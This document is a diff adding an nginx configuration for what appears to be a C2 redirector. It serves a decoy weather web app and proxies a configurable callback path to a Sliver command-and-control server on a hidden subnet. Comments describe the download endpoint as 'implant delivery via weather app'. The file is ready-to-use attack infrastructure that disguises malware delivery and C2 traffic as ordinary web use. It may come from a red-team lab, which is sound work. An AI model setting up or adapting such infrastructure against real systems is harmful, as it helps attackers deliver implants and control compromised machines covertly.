@@ -1,0 +1,59 @@
+worker_processes auto;
+pid /run/nginx.pid;
+
+events {
+    worker_connections 1024;
+}
+
+http {
+    include /etc/nginx/mime.types;
+    default_type application/octet-stream;
+    sendfile on;
+    keepalive_timeout 65;
+
+    # Weather frontend (Express.js)
+    upstream weather_app {
+        server 127.0.0.1:${WEATHER_APP_PORT};
+    }
+
+    # Sliver C2 on the hidden c2-net subnet
+    upstream sliver_c2 {
+        server ${SLIVER_C2_HOST}:${SLIVER_HTTP_PORT};
+    }
+
+    server {
+        listen ${NGINX_HTTP_PORT};
+        server_name _;
+
+        # Default: serve weather frontend
+        location / {
+            proxy_pass http://weather_app;
+            proxy_set_header Host $host;
+            proxy_set_header X-Real-IP $remote_addr;
+            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        }
+
+        # Weather app routes
+        location /weather/ {
+            proxy_pass http://weather_app/weather/;
+            proxy_set_header Host $host;
+            proxy_set_header X-Real-IP $remote_addr;
+        }
+
+        # Download endpoint (implant delivery via weather app)
+        location /api/download/ {
+            proxy_pass http://weather_app/api/download/;
+            proxy_set_header Host $host;
+            proxy_set_header X-Real-IP $remote_addr;
+        }
+
+        # C2 callback path - proxied to sliver on hidden subnet
+        location ${SLIVER_C2_PATH} {
+            proxy_pass http://sliver_c2;
+            proxy_set_header Host $host;
+            proxy_set_header X-Real-IP $remote_addr;
+            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+            proxy_buffering off;
+        }
+    }
+}
